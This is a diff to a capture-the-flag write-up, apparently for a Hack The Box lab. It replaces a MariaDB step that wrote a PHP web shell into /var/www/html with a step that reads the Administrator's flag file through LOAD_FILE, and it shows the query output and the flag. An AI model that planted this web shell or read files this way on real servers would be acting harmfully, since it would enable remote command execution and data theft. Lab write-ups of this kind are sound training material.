@@ -140,12 +140,21 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 MariaDB [(none)]> 
 ```
 
-**mysql database**
+**Flag: LOAD_FILE Function**
 
-- use the mysql database
-- create a file
+- Use the LOAD_FILE function to read the flag on the Admin's desktop
+- How did I know it was there? From doing a lot of boxes, flags are usually on the admin's or some users desktop
 ```
-SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+MariaDB [(none)]> SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
++------------------------------------------------------+
+| LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt") |
++------------------------------------------------------+
+| HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}              |
++------------------------------------------------------+
+1 row in set (0.031 sec)
+
+MariaDB [(none)]> 
+
 ```
 
 ## Medium
